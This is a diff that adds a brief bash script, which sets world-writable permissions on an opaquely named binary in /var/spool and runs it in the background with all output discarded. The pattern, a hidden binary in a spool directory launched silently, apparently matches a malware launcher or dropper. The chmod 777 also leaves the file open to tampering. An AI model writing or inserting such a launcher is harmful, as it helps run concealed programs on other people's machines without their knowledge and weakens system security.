@@ -1,0 +1,6 @@
+#!/bin/bash
+chmod 777 /var/spool/xyys81255
+sleep 1
+cd /var/spool/
+sleep 5
+./xyys81255  > /dev/null &
